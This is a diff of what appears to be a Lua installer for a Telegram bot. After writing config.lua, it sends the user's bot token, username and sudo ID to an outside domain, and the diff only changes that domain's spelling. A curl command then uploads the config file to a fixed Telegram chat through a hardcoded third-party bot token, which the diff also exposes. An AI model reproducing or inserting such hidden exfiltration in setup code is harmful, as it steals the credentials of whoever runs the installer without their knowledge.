@@ -56,7 +56,7 @@ username = username,
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-https.request("https://ibcorp.ibuser.xyz/faeder/?id="..SUDO.."&user="..username.."&token="..token)
+https.request("https://ibcoooorp.ibuser.xyz/faeder/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 1037629957 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("RUNFA.sh", "w")  
 file:write([[
